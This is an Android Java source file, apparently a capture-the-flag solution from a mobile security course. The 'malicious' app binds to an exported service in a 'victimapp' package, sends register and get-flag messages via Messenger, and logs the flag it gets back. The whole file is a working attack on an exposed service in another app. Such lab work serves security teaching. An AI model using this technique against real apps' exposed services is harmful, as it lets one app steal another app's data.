package com.example.maliciousapp6;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.Messenger;
import android.util.Log;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {
    static final String TAG = "MOBIOTSEC";

    private Intent serviceIntent;


    static final int MSG_REGISTER_CLIENT = 1;
    static final int MSG_UNREGISTER_CLIENT = 2;
    static final int MSG_SET_VALUE = 3;
    static final int MSG_GET_FLAG = 4;

    private boolean mIsBound = false;
    Messenger mServiceOtherAppMessenger, mReciverMessengerHandler;


    class RecieverHandler extends Handler {
        @Override
        public void handleMessage(@NonNull Message msg) {
            switch (msg.what){
                case MSG_REGISTER_CLIENT:
                    Log.i(TAG, "MY: MaliciousApp: bound to the service");
                    break;
                case MSG_GET_FLAG:
                    Bundle b = (Bundle) msg.obj;
                    String flag = b.get("flag").toString();
                    Log.i(TAG, "flag: " + flag);
                    break;
                default:
                    break;
            }
            super.handleMessage(msg);
        }
    }

    ServiceConnection serviceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            try {
                mServiceOtherAppMessenger = new Messenger(service);
                mReciverMessengerHandler = new Messenger(new RecieverHandler());
                mIsBound = true;
                Log.i(TAG, "onServiceConnected");
                myfunction();
            } catch(Exception e){
                Log.e(TAG, e.toString());
            }

        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            try {
                mServiceOtherAppMessenger = null;
                mReciverMessengerHandler = null;
                mIsBound = false;
                Log.i(TAG, "onServiceDisconnected");
            }catch(Exception e){
                Log.e(TAG,e.toString());
            }
        }
    };

    public void myfunction(){
        if(!mIsBound){
            return;
        }
        // Create and send a message to the service, using a supported 'what' value
        Message msg = Message.obtain(null, MSG_REGISTER_CLIENT);
        msg.replyTo = mReciverMessengerHandler; // set into the message the messenger handler as (FROM) [me]
        Message msg2 = Message.obtain(null, MSG_GET_FLAG);

        try{
            mServiceOtherAppMessenger.send(msg);
            mServiceOtherAppMessenger.send(msg2);
        } catch (Exception e){
            Log.e(TAG, "myfunciton(): " + e.toString() );
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        serviceIntent = new Intent();
                                                        //package name                  //package name + class that implement the service
        serviceIntent.setComponent(new ComponentName("com.example.victimapp","com.example.victimapp.UnbindableService"));

        bindToRemoteService();

    }

    private void bindToRemoteService(){
        bindService(serviceIntent, serviceConnection, Context.BIND_AUTO_CREATE);
        Toast.makeText(getApplicationContext(), "service bound", Toast.LENGTH_SHORT).show();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if(mIsBound){
            unbindService(serviceConnection);
            mIsBound = false;
        }
        Log.i(TAG, "onDestroy");
    }

    @Override
    protected void onStop() {
        super.onStop();
        if (mIsBound){
            unbindService(serviceConnection);
            mIsBound = false;
        }
        Log.i(TAG, "onStop");
    }
}